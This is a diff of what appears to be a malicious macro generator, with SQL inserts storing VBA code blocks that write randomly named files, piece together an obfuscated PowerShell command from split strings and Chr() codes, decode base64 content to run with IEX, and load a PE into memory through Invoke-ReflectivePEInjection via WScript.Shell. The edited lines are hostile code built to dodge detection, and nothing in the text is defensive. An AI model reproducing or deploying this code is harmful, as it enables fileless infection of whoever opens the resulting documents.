@@ -468,7 +468,6 @@ End Sub
 --15
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('WriteFile', 'util', '
 Function cfile(b As String)
-    pth = Application.UserLibraryPath & rndname & ".txt"
     pth = Application.UserLibraryPath & GetRnd & ".txt"
     Dim f As Object
     Set f = CreateObject("Sc" & "riptin" & "g.Fil" & "eSyst" & "emObj" & "ect")
@@ -496,7 +495,7 @@ Sub |RANDOMNAME|()
     Chr(110) & Chr(100) & Chr(32) & "$s=gc " & p1 & ";$f = gc " & p2 & _
     ";$b = [System.Convert]::FromBas" & "e64String($f); " & Chr(105) & Chr(101) & Chr(88) & _
     "([System.Text.Encoding]::Ascii.GetString([System.Convert]:" & _
-    ":FromBas" & "e64String($s))); Invoke-Reflec" & "tivePEIn" & "jection -PEBytes $b" & Chr(34)
+    ":FromBas" & "e64String($s))); Invoke-Reflec" & "tivePEIn" & "jection -PEBytes $b" & Chr(34) & _
     "([System.Text.Enc" & "oding]::Ascii.GetString([System.Convert]:" & _
     ":FromBas" & "e64String($s))); Invoke-Reflec" & "tivePEIn" & "jection -PE" & "Bytes $b" & Chr(34)
     Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
